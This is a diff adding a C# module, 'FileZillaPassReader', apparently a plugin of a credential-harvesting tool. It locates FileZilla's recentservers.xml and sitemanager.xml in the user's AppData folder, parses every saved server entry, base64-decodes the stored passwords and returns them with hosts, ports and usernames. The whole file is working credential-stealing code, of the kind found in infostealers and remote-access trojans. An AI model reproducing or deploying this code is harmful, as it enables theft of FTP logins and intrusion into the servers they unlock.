@@ -1,0 +1,107 @@
+﻿
+
+using InvokedCommon.Models;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text;
+using System.Xml;
+
+
+namespace Plugin.Helper.FtpClients
+{
+	public class FileZillaPassReader : IAccountReader
+	{
+		public string RecentServerPath = string.Format("{0}\\FileZilla\\recentservers.xml", (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+		public string SiteManagerPath = string.Format("{0}\\FileZilla\\sitemanager.xml", (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+
+		public string ApplicationName => "FileZilla";
+
+		public IEnumerable<RecoveredAccount> ReadAccounts()
+		{
+			List<RecoveredAccount> recoveredAccountList = new List<RecoveredAccount>();
+			try
+			{
+				if (!File.Exists(this.RecentServerPath) && !File.Exists(this.SiteManagerPath))
+					return (IEnumerable<RecoveredAccount>) recoveredAccountList;
+				if (File.Exists(this.RecentServerPath))
+				{
+					XmlTextReader reader = new XmlTextReader(this.RecentServerPath);
+					XmlDocument xmlDocument = new XmlDocument();
+					xmlDocument.Load((XmlReader) reader);
+					foreach (XmlNode childNode1 in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
+					{
+						string str1 = string.Empty;
+						string str2 = string.Empty;
+						string str3 = string.Empty;
+						foreach (XmlNode childNode2 in childNode1.ChildNodes)
+						{
+							if (childNode2.Name == "Host")
+								str1 = childNode2.InnerText;
+							if (childNode2.Name == "Port")
+								str1 = str1 + ":" + childNode2.InnerText;
+							if (childNode2.Name == "User")
+								str2 = childNode2.InnerText;
+							if (childNode2.Name == "Pass")
+								str3 = this.Base64Decode(childNode2.InnerText);
+						}
+						recoveredAccountList.Add(new RecoveredAccount()
+						{
+							Url = str1,
+							Username = str2,
+							Password = str3,
+							Application = this.ApplicationName
+						});
+					}
+				}
+				if (File.Exists(this.SiteManagerPath))
+				{
+					XmlTextReader reader = new XmlTextReader(this.SiteManagerPath);
+					XmlDocument xmlDocument = new XmlDocument();
+					xmlDocument.Load((XmlReader) reader);
+					foreach (XmlNode childNode3 in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
+					{
+						string str4 = string.Empty;
+						string str5 = string.Empty;
+						string str6 = string.Empty;
+						foreach (XmlNode childNode4 in childNode3.ChildNodes)
+						{
+							if (childNode4.Name == "Host")
+								str4 = childNode4.InnerText;
+							if (childNode4.Name == "Port")
+								str4 = str4 + ":" + childNode4.InnerText;
+							if (childNode4.Name == "User")
+								str5 = childNode4.InnerText;
+							if (childNode4.Name == "Pass")
+								str6 = this.Base64Decode(childNode4.InnerText);
+						}
+						recoveredAccountList.Add(new RecoveredAccount()
+						{
+							Url = str4,
+							Username = str5,
+							Password = str6,
+							Application = "FileZilla"
+						});
+					}
+				}
+				return (IEnumerable<RecoveredAccount>) recoveredAccountList;
+			}
+			catch
+			{
+				return (IEnumerable<RecoveredAccount>) recoveredAccountList;
+			}
+		}
+
+		public string Base64Decode(string szInput)
+		{
+			try
+			{
+				return Encoding.UTF8.GetString(Convert.FromBase64String(szInput));
+			}
+			catch
+			{
+				return szInput;
+			}
+		}
+	}
+}
